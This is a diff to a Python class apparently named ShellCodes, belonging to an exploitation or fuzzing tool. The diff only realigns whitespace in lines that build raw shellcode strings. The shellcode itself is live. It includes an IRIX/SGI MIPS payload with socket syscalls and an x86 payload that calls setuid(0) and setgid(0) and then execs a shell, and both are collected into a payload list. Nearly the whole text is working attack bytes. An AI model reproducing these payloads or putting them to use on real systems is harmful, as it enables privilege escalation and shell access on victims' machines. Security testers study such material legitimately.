@@ -60,14 +60,14 @@ class ShellCodes():
 
         #SHELLCODE IRIX SGI + NOOP
         shellcode =     "\x30\x0b\xff\xff"    #/* andi    $t3,$zero,0xffff     */
-        shellcode +=       "\x24\x02\x04\x01"    #/* li      $v0,1024+1           */
-        shellcode +=       "\x20\x42\xff\xff"    #/* addi    $v0,$v0,-1           */
-        shellcode +=        "\x03\xff\xff\xcc"    #/* syscall                      */
-        shellcode +=        "\x30\x44\xff\xff"    #/* andi    $a0,$v0,0xffff       */
-        shellcode +=        "\x31\x65\xff\xff"    #/* andi    $a1,$t3,0xffff       */
-        shellcode +=        "\x24\x02\x04\x64"  #  /* li      $v0,1124             */
-        shellcode +=        "\x03\xff\xff\xcc"    #/* syscall                      */
-        shellcode +=      "\x24\x0f\x12\x34"    #NOOP
+        shellcode +=    "\x24\x02\x04\x01"    #/* li      $v0,1024+1           */
+        shellcode +=    "\x20\x42\xff\xff"    #/* addi    $v0,$v0,-1           */
+        shellcode +=    "\x03\xff\xff\xcc"    #/* syscall                      */
+        shellcode +=    "\x30\x44\xff\xff"    #/* andi    $a0,$v0,0xffff       */
+        shellcode +=    "\x31\x65\xff\xff"    #/* andi    $a1,$t3,0xffff       */
+        shellcode +=    "\x24\x02\x04\x64"    #/* li      $v0,1124             */
+        shellcode +=    "\x03\xff\xff\xcc"    #/* syscall                      */
+        shellcode +=    "\x24\x0f\x12\x34"    #NOOP
         self.payloads.append([
             "SHELLCODE IRIX SGI + NOOP",
             "socket",
@@ -79,7 +79,7 @@ class ShellCodes():
 
         # SHELLCODE x86 setgid 0 && SHELLCODE x86 setuid 0
         shellcode =     "\x33\xDB\x33\xC0\xB0\x1B\xCD\x80" # alarm(0);
-        shellcode +=   "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" # setuid(0);
+        shellcode +=    "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" # setuid(0);
         shellcode +=    "\x31\xc0\x50\x50\xb0\xb5\xcd\x80" # setgid(0);
         shellcode +=    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
         shellcode +=    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
